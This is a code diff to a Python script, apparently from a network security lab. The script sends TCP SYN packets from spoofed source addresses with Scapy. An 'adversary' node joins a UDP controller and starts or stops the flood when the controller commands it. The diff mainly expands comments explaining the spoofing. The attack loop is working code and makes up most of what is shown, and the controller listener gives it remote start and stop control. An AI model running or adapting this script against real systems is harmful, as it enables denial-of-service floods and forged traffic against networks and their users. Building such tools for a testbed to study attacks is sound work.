@@ -26,13 +26,18 @@ def spoof_attack():
     """
     while True:
         if running:
-            # Generate a random source IP from a different subnet
+            # --- IP Spoofing Core Logic ---
+            # 1. Generate a fake (spoofed) source IP address.
+            # This makes the packet appear to come from a random machine on the network.
             spoof_ip = f"10.10.1.{random.randint(2, 254)}"
             
-            # Craft the packet using Scapy
+            # 2. Craft the raw packet using Scapy.
+            # We create an IP header with the *spoofed* source IP and the real target IP.
+            # We then add a TCP header for a SYN packet (flags="S") to initiate a connection.
+            # The target will send its reply (SYN-ACK) to the fake 'spoof_ip', which will go nowhere.
             packet = IP(src=spoof_ip, dst=TARGET_IP) / TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="S")
             
-            # Send the packet without printing Scapy's default output
+            # 3. Send the packet without printing Scapy's default output.
             send(packet, verbose=False)
             
             print(f"[*] Sent spoofed packet from {spoof_ip} to {TARGET_IP}:{TARGET_PORT}")
@@ -47,16 +52,16 @@ def control_listener():
     """
     global running
     
-    # 1. Create a UDP socket to communicate with the controller
+    # Create a UDP socket to communicate with the controller
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     server_address = (CONTROL_HOST, CONTROL_PORT)
 
-    # 2. Announce presence to the controller by sending a "join" packet
+    # Announce presence to the controller by sending a "join" packet
     join_packet = {"type": "join", "role": "adversary"}
     sock.sendto(json.dumps(join_packet).encode('utf-8'), server_address)
     print(f"[*] Adversary node has joined the controller at {CONTROL_HOST}:{CONTROL_PORT}")
 
-    # 3. Listen indefinitely for commands
+    # Listen indefinitely for commands
     while True:
         try:
             # Wait to receive data from the controller
@@ -66,7 +71,7 @@ def control_listener():
             packet = json.loads(data.decode('utf-8'))
             command = packet.get("type")
 
-            # 4. Check the command and update the 'running' state
+            # Check the command and update the 'running' state
             if command == "start" and not running:
                 running = True
                 print("\n[+] Received START command. Adversary attack initiated.")
